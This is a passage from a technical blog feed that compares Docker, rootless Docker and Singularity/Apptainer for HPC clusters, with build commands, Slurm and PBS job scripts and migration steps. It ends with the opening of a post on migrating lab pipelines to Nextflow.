<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Check version</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">apptainer </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--version</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Run a test container from Docker Hub</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">apptainer run docker://ubuntu:22.04 </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"Apptainer works"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># List available sub-commands</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">apptainer </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--help</span><br></span></code></pre></div></div>
<p>Once installed globally via Pixi, Apptainer is available to all projects and users without needing to activate environments for each session.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="building-singularityapptainer-containers">Building Singularity/Apptainer Containers<a href="https://riverxdata.github.io/river-docs/blog/containers-hpc-docker-singularity-apptainer#building-singularityapptainer-containers" class="hash-link" aria-label="Direct link to Building Singularity/Apptainer Containers" title="Direct link to Building Singularity/Apptainer Containers" translate="no">​</a></h3>
<p>You can build from Docker images or write native definition files:</p>
<p><strong>Method 1: Convert Docker image</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Build directly from Docker Hub</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">apptainer build ubuntu.sif docker://ubuntu:22.04</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Build from existing Docker image</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">apptainer build myapp.sif docker://myregistry.com/myapp:latest</span><br></span></code></pre></div></div>
<p><strong>Method 2: Write a definition file</strong></p>
<p>Create <code>myapp.def</code>:</p>
<div class="language-singularity codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-singularity codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Bootstrap: docker</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">From: ubuntu:22.04</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">%post</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    apt-get update</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    apt-get install -y python3 pip</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    pip install numpy scipy</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">%environment</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    export PATH=/usr/local/bin:$PATH</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">%runscript</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    exec python3 "$@"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">%help</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    This container runs Python analysis scripts</span><br></span></code></pre></div></div>
<p>Build it:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Note: first build may require sudo, but running requires no special privileges</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">apptainer build myapp.sif myapp.def</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Run without any special privileges</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">apptainer run myapp.sif script.py</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="integrating-with-hpc-job-schedulers">Integrating with HPC Job Schedulers<a href="https://riverxdata.github.io/river-docs/blog/containers-hpc-docker-singularity-apptainer#integrating-with-hpc-job-schedulers" class="hash-link" aria-label="Direct link to Integrating with HPC Job Schedulers" title="Direct link to Integrating with HPC Job Schedulers" translate="no">​</a></h3>
<p><strong>With Slurm:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token shebang important" style="color:hsl(230, 8%, 24%);font-weight:bold">#!/bin/bash</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)">#SBATCH --job-name=analysis</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)">#SBATCH --ntasks=4</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)">#SBATCH --mem=16GB</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)">#SBATCH --time=01:00:00</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Run container through scheduler</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">apptainer run myapp.sif python /data/analysis.py</span><br></span></code></pre></div></div>
<p><strong>With PBS:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token shebang important" style="color:hsl(230, 8%, 24%);font-weight:bold">#!/bin/bash</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)">#PBS -N analysis</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)">#PBS -l select=1:ncpus=4:mem=16gb</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)">#PBS -l walltime=01:00:00</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">cd</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">$PBS_O_WORKDIR</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">apptainer run myapp.sif python /data/analysis.py</span><br></span></code></pre></div></div>
<p>Singularity doesn't interfere with scheduler resource allocation—it uses standard system calls.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="key-singularityapptainer-features">Key Singularity/Apptainer Features<a href="https://riverxdata.github.io/river-docs/blog/containers-hpc-docker-singularity-apptainer#key-singularityapptainer-features" class="hash-link" aria-label="Direct link to Key Singularity/Apptainer Features" title="Direct link to Key Singularity/Apptainer Features" translate="no">​</a></h3>
<table><thead><tr><th>Feature</th><th>Singularity/Apptainer</th><th>Docker</th><th>Docker Rootless</th></tr></thead><tbody><tr><td>No daemon required</td><td>✅ Yes</td><td>❌ No</td><td>❌ No</td></tr><tr><td>Single file format</td><td>✅ Yes</td><td>❌ No</td><td>❌ No</td></tr><tr><td>User identity preserved</td><td>✅ Yes</td><td>❌ No</td><td>⚠️ Partial</td></tr><tr><td>HPC scheduler integration</td><td>✅ Yes</td><td>❌ No</td><td>❌ No</td></tr><tr><td>Permission isolation</td><td>✅ Yes</td><td>⚠️ Limited</td><td>⚠️ Limited</td></tr><tr><td>Resource control</td><td>✅ Via cgroups</td><td>✅ Native</td><td>⚠️ Limited</td></tr><tr><td>Learning curve</td><td>⚠️ Moderate</td><td>✅ Low</td><td>✅ Low</td></tr></tbody></table>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="practical-comparison-running-a-bioinformatics-pipeline">Practical Comparison: Running a Bioinformatics Pipeline<a href="https://riverxdata.github.io/river-docs/blog/containers-hpc-docker-singularity-apptainer#practical-comparison-running-a-bioinformatics-pipeline" class="hash-link" aria-label="Direct link to Practical Comparison: Running a Bioinformatics Pipeline" title="Direct link to Practical Comparison: Running a Bioinformatics Pipeline" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="with-docker-not-recommended-on-hpc">With Docker (Not Recommended on HPC)<a href="https://riverxdata.github.io/river-docs/blog/containers-hpc-docker-singularity-apptainer#with-docker-not-recommended-on-hpc" class="hash-link" aria-label="Direct link to With Docker (Not Recommended on HPC)" title="Direct link to With Docker (Not Recommended on HPC)" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Requires privileged setup</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> run </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"> /data:/data myapp:latest </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  bwa mem reference.fa reads.fastq </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> output.sam</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="with-docker-rootless-better-still-limited">With Docker Rootless (Better, Still Limited)<a href="https://riverxdata.github.io/river-docs/blog/containers-hpc-docker-singularity-apptainer#with-docker-rootless-better-still-limited" class="hash-link" aria-label="Direct link to With Docker Rootless (Better, Still Limited)" title="Direct link to With Docker Rootless (Better, Still Limited)" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># No sudo, but still not HPC-optimized</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> run </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"> /data:/data myapp:latest </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  bwa mem reference.fa reads.fastq </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> output.sam</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="with-singularityapptainer-hpc-ready">With Singularity/Apptainer (HPC-Ready)<a href="https://riverxdata.github.io/river-docs/blog/containers-hpc-docker-singularity-apptainer#with-singularityapptainer-hpc-ready" class="hash-link" aria-label="Direct link to With Singularity/Apptainer (HPC-Ready)" title="Direct link to With Singularity/Apptainer (HPC-Ready)" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Simple, no special privileges, works with Slurm</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">singularity </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">exec</span><span class="token plain"> myapp.sif </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  bwa mem reference.fa reads.fastq </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> output.sam</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Or in a Slurm script</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">sbatch </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-N</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--ntasks</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">8</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--mem</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">32G myjob.sh</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># (inside myjob.sh runs singularity as normal)</span><br></span></code></pre></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="migration-path-from-docker-to-apptainer">Migration Path: From Docker to Apptainer<a href="https://riverxdata.github.io/river-docs/blog/containers-hpc-docker-singularity-apptainer#migration-path-from-docker-to-apptainer" class="hash-link" aria-label="Direct link to Migration Path: From Docker to Apptainer" title="Direct link to Migration Path: From Docker to Apptainer" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="step-1-identify-your-docker-images">Step 1: Identify Your Docker Images<a href="https://riverxdata.github.io/river-docs/blog/containers-hpc-docker-singularity-apptainer#step-1-identify-your-docker-images" class="hash-link" aria-label="Direct link to Step 1: Identify Your Docker Images" title="Direct link to Step 1: Identify Your Docker Images" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># List your images</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> images</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="step-2-build-apptainer-containers">Step 2: Build Apptainer Containers<a href="https://riverxdata.github.io/river-docs/blog/containers-hpc-docker-singularity-apptainer#step-2-build-apptainer-containers" class="hash-link" aria-label="Direct link to Step 2: Build Apptainer Containers" title="Direct link to Step 2: Build Apptainer Containers" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Convert existing Docker images</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">apptainer build myapp.sif docker://myregistry/myapp:latest</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Or build from Docker Compose</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># First, build your Docker image</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> build </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-t</span><span class="token plain"> myapp:latest </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Then convert</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">apptainer build myapp.sif docker-daemon://myapp:latest</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="step-3-test-locally">Step 3: Test Locally<a href="https://riverxdata.github.io/river-docs/blog/containers-hpc-docker-singularity-apptainer#step-3-test-locally" class="hash-link" aria-label="Direct link to Step 3: Test Locally" title="Direct link to Step 3: Test Locally" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Run and verify</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">apptainer run myapp.sif </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">command</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">apptainer </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">exec</span><span class="token plain"> myapp.sif python script.py</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="step-4-deploy-on-hpc">Step 4: Deploy on HPC<a href="https://riverxdata.github.io/river-docs/blog/containers-hpc-docker-singularity-apptainer#step-4-deploy-on-hpc" class="hash-link" aria-label="Direct link to Step 4: Deploy on HPC" title="Direct link to Step 4: Deploy on HPC" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Copy to cluster</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">scp</span><span class="token plain"> myapp.sif user@hpc-cluster:/home/user/</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Use in job scripts</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">sbatch my_job.sh</span><br></span></code></pre></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="best-practices-for-hpc-containers">Best Practices for HPC Containers<a href="https://riverxdata.github.io/river-docs/blog/containers-hpc-docker-singularity-apptainer#best-practices-for-hpc-containers" class="hash-link" aria-label="Direct link to Best Practices for HPC Containers" title="Direct link to Best Practices for HPC Containers" translate="no">​</a></h2>
<ol>
<li class=""><strong>Minimize image size</strong> - Large containers slow down transfer and startup</li>
<li class=""><strong>Use caching layers efficiently</strong> - Order Dockerfile commands from least to most frequently changed</li>
<li class=""><strong>Bind mount data</strong> - Keep data outside containers, use volume mounts</li>
<li class=""><strong>Preserve user context</strong> - Avoid setting specific UIDs in production containers</li>
<li class=""><strong>Test locally first</strong> - Verify on your machine before cluster deployment</li>
<li class=""><strong>Version your containers</strong> - Use tags, keep definition files in version control</li>
<li class=""><strong>Document dependencies</strong> - Include build instructions and software versions</li>
</ol>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="when-to-use-what">When to Use What<a href="https://riverxdata.github.io/river-docs/blog/containers-hpc-docker-singularity-apptainer#when-to-use-what" class="hash-link" aria-label="Direct link to When to Use What" title="Direct link to When to Use What" translate="no">​</a></h2>
<table><thead><tr><th>Scenario</th><th>Recommendation</th></tr></thead><tbody><tr><td>Local development</td><td>Docker or Docker Desktop</td></tr><tr><td>Single-user HPC access</td><td>Singularity/Apptainer</td></tr><tr><td>Multi-tenant HPC cluster</td><td>Singularity/Apptainer (mandatory)</td></tr><tr><td>Rootless requirement</td><td>Docker rootless or Singularity/Apptainer</td></tr><tr><td>Kubernetes clusters</td><td>Docker or similar (not HPC-focused)</td></tr><tr><td>Maximum compatibility</td><td>Singularity/Apptainer (works everywhere)</td></tr></tbody></table>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="conclusion">Conclusion<a href="https://riverxdata.github.io/river-docs/blog/containers-hpc-docker-singularity-apptainer#conclusion" class="hash-link" aria-label="Direct link to Conclusion" title="Direct link to Conclusion" translate="no">​</a></h2>
<p>Docker is an excellent tool for development and modern cloud infrastructure, but HPC environments require a different approach. Docker rootless improves Docker's security model but doesn't fundamentally address HPC integration.</p>
<p><strong>Singularity/Apptainer is the clear choice for HPC</strong> because it:</p>
<ul>
<li class="">Runs without a daemon or root privileges</li>
<li class="">Preserves user identity and permissions</li>
<li class="">Integrates seamlessly with job schedulers</li>
<li class="">Uses portable single-file containers</li>
<li class="">Was designed specifically for scientific computing clusters</li>
</ul>
<p>If you're working on HPC systems, adopt Singularity/Apptainer. If you're developing locally, use Docker—then convert to Singularity when deploying to the cluster. This hybrid approach gives you the best of both worlds: Docker's familiarity for development and Singularity's robustness for production HPC workloads.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="further-reading">Further Reading<a href="https://riverxdata.github.io/river-docs/blog/containers-hpc-docker-singularity-apptainer#further-reading" class="hash-link" aria-label="Direct link to Further Reading" title="Direct link to Further Reading" translate="no">​</a></h3>
<ul>
<li class=""><a href="https://apptainer.org/docs/" target="_blank" rel="noopener noreferrer" class="">Apptainer Documentation</a></li>
<li class=""><a href="https://singularity-ce.readthedocs.io/" target="_blank" rel="noopener noreferrer" class="">Singularity Documentation</a></li>
<li class=""><a href="https://docs.docker.com/engine/security/rootless/" target="_blank" rel="noopener noreferrer" class="">Docker Rootless Mode</a></li>
<li class=""><a href="https://apptainer.org/docs/user/main/docker_and_oci.html" target="_blank" rel="noopener noreferrer" class="">Converting Docker Images to Singularity</a></li>
</ul>]]></content>
        <author>
            <name>Thanh-Giang Tan Nguyen</name>
            <email>nttg8100@gmail.com</email>
            <uri>https://www.facebook.com/nttg8100</uri>
        </author>
        <category label="hpc" term="hpc"/>
        <category label="docker" term="docker"/>
        <category label="containers" term="containers"/>
        <category label="singularity" term="singularity"/>
        <category label="apptainer" term="apptainer"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[How to Migrate from In-House Pipelines to Enterprise-Level Workflows: A Proven 3-Step Validation Framework]]></title>
        <id>https://riverxdata.github.io/river-docs/blog/migrate-bash-nextflow-enterprise-pipeline</id>
        <link href="https://riverxdata.github.io/river-docs/blog/migrate-bash-nextflow-enterprise-pipeline"/>
        <updated>2026-02-11T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Whether your lab uses bash scripts, Python workflows, Snakemake pipelines, or custom solutions—your in-house pipeline works fine locally. It's been running for years. But as your research scales, you face a hard truth: in-house pipelines don't scale, aren't reproducible across teams, and require constant manual fixes.]]></summary>
        <content type="html"><![CDATA[<p>Whether your lab uses bash scripts, Python workflows, Snakemake pipelines, or custom solutions—your in-house pipeline works fine locally. It's been running for years. But as your research scales, you face a hard truth: in-house pipelines don't scale, aren't reproducible across teams, and require constant manual fixes.</p>
<p>This is where enterprise-level workflow management comes in. But before you migrate your entire pipeline to Nextflow (or any professional workflow manager), you need answers to the hardest question: <strong>Will the new pipeline produce identical results?</strong></p>
<p>This blog reveals the proven 3-step framework used by production teams to confidently migrate ANY bioinformatics pipeline—regardless of its original format. You'll learn how to establish reproducibility baselines, control for non-deterministic behavior, and validate that your enterprise pipeline is scientifically equivalent to your original work. Plus, we'll show you how nf-test automates this entire validation process when migrating to Nextflow.</p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="why-enterprise-pipelines-matter-the-numbers">Why Enterprise Pipelines Matter: The Numbers<a href="https://riverxdata.github.io/river-docs/blog/migrate-bash-nextflow-enterprise-pipeline#why-enterprise-pipelines-matter-the-numbers" class="hash-link" aria-label="Direct link to Why Enterprise Pipelines Matter: The Numbers" title="Direct link to Why Enterprise Pipelines Matter: The Numbers" translate="no">​</a></h2>
